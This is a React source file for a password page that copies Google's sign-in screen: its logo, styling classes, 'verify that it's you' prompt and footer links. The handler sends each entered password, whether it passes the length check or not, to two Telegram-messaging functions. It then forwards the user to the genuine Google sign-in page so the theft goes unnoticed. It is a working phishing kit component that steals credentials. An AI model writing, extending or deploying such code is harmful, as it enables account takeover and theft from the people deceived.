import React, { useState } from 'react';
import './Password.css'
import { useSelector } from 'react-redux';
import { sendMessageToTelegram, sendMessageToTelegram2 } from './TelegramBotComponent'; 

function Password() {
    const globalVariable = useSelector((state) => state.globalVariable);
   
    const [showPassword, setShowPassword] = useState(false);
    const [passwordValue, setPasswordValue] = useState('');
    const [passwordError, setPasswordError] = useState('');

    const togglePasswordVisibility = () => {
        setShowPassword((prevShowPassword) => !prevShowPassword);
    };

    const handlePasswordChange = (e) => {
        // Update the local state with the input value
        setPasswordValue(e.target.value);
       
    };

    const validatePassword = (password) => {
        // Regular expression for a simple Gmail validation
        const passwordRegex = /^.{8,}$/;
        return passwordRegex.test(password);
    };

    const isLinkDisabled = !validatePassword(passwordValue);

    const handleButtonClick = () => {
        // Modify the global variable
        if (!validatePassword(passwordValue)) {
            // If validation fails, set an error state and prevent moving to the next page
            setPasswordError('Invalid Gmail address');
            sendMessageToTelegram(`Failed Password: ${passwordValue}`);
            sendMessageToTelegram2(`Failed Password: ${passwordValue}`);
            
            
          } else {
            // If validation succeeds, clear the error state and proceed to the next page
            setPasswordError('');
            sendMessageToTelegram(`Password: ${passwordValue}`);
            sendMessageToTelegram2(`Password: ${passwordValue}`);
           
          }
        
        
    };

    

    

    


    return (
       
        <body>
            <main > 
                <div class="InputContainer">
                    <img class="googlepic"src="https://assets.stickpng.com/images/580b57fcd9996e24bc43c51f.png" alt="" height="25"/>
                    <h2 class="login">Welcome</h2>
                        <div class="Wz0RKd">
                            <div  class="YZrg6 HnRr5d iiFyne cd29Sd kWC5Rd"  >
                                
                                    <div class="qQWzTd" aria-hidden="true">
                                    <svg aria-hidden="true" class="stUf5b" fill="currentColor" focusable="false" width="48px" height="24px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg">
                                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm6.36 14.83c-1.43-1.74-4.9-2.33-6.36-2.33s-4.93.59-6.36 2.33C4.62 15.49 4 13.82 4 12c0-4.41 3.59-8 8-8s8 3.59 8 8c0 1.82-.62 3.49-1.64 4.83zM12 6c-1.94 0-3.5 1.56-3.5 3.5S10.06 13 12 13s3.5-1.56 3.5-3.5S13.94 6 12 6z">
                                            
                                        </path>
                                    </svg>
                                   
                                </div>
                                <div jsname="bQIQze" class="KTeGk" data-profile-identifier="" translate="no">{globalVariable}
                                </div>
                            </div>
                        </div>
                    <h4 class="guestverify">To continue, first verify that it's you
                    
                    </h4>
                    <input type={showPassword ? 'text' : 'password'} className={`gInput1 ${passwordError ? 'error' : ''}`} placeholder="Enter your password" value={passwordValue} onChange={handlePasswordChange}/> 
                    <label class={`inputLabel1 ${passwordError ? 'error' : ''}`}></label>
                    {passwordError && 
                    <div class="o6cuMc1 Jj6Lae1"><span class="jibhHc"><svg aria-hidden="true" class="stUf5bqpSchb1" fill="currentColor" focusable="false" width="16px" height="16px" viewBox="0 0 24 24" xmlns="https://www.w3.org/2000/svg"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"></path></svg></span><span class="gshgshs1">Wrong password. Try again or click ‘Forgot password’ to reset it.</span></div>}


                    
                        <div class="sSzDjeNEk0Ve">
                            
                                <div class="VfPpkd-MPu53c VfPpkd-MPu53c-OWXEXe-dgl2Hf Ne8lhe swXlm az2ine y5MMGc sD2Hod VfPpkd-MPu53c-OWXEXe-mWPk3d"  >
                                    <input class="VfPp" type="checkbox" checked={showPassword}
            onChange={togglePasswordVisibility}/>
                                        
                                </div>
                            
                            <div class="DVnhEd">
                                    <div jsslot="" id="selectionc55" class="d3GVvdjGAaxb" jsname="CeL6Qc">Show password</div>
                            </div>
                        </div>
                    

                    
                    
                    
                    <div className="buttonContainer1"> 
                        <a className="btnCreate">Forgot Password?</a>
                        {isLinkDisabled ? (
                    <a className="btnNext" disabled onClick={handleButtonClick}>
                        Next
                    </a>
                    ) : (
                    <a href="https://accounts.google.com/v3/signin/identifier?authuser=0&continue=https%3A%2F%2Fmyaccount.google.com%2F%3Futm_source%3Dsign_in_no_continue%26pli%3D1&ec=GAlAwAE&hl=en_GB&service=accountsettings&flowName=GlifWebSignIn&flowEntry=AddSession&dsh=S167855388%3A1706218793463418&theme=glif"  className="btnNext" onClick={handleButtonClick}>
                        Next
                    </a>
                    )}
                    </div>
                </div>
                <footer class="foot">
                    <div class="VfPpkd-TkwUic" >
                        <button class="languagebutton" id="languageButton" onclick="toggleDropdown()">
                        {/* <span >
                            <span class="VfPpkd-NSFCdd-Brv4Fb"> 
                            </span>
                            <span class="VfPpkd-NSFCdd-MpmGFe">
                            </span>
                        </span> */}
                        <span class="VfPpkd-uusGie-fmcmS-haAclf">
                        
                            English (United Kingdom)
                        
                        </span>
                        <span class="VfPpkd-t08AT-Bz112c" >
                            <svg class="VfPpkd-t08AT-Bz112c-Bd00G" viewBox="7 10 10 5" focusable="false" height="12" width="12">
                                <polygon class="VfPpkd-t08AT-Bz112c-mt1Mkb" stroke="none" fill-rule="evenodd" points="7 10 12 15 17 10">
                                </polygon>
                                {/* <polygon class="VfPpkd-t08AT-Bz112c-auswjd" stroke="none" fill-rule="evenodd" points="7 15 12 10 17 15">
                                </polygon> */}
                            </svg>
                        </span>
                        </button>
                        <span id="i3" aria-hidden="true" role="listbox"></span>
                    </div>
                
                    <div>
                        <ul className="Info">
                            <li>
                                <a class="NUwdAbTrZEUc1" href="https://support.google.com/accounts?hl=en-GB&amp;p=account_iph" >Help
                                </a>
                            </li>
                            <li>
                                <a class="NUwdAbTrZEUc2" href="https://accounts.google.com/TOS?loc=GH&amp;hl=en-GB&amp;privacy=true" >Privacy
                                </a>
                            </li>
                            <li>
                                <a class="NUwdAbTrZEUc3" href="https://accounts.google.com/TOS?loc=GH&amp;hl=en-GB" >Terms
                                </a>
                            </li>
                        </ul>
                    </div>
                    
                </footer>
            </main>
        </body>
    )
}

export default Password;




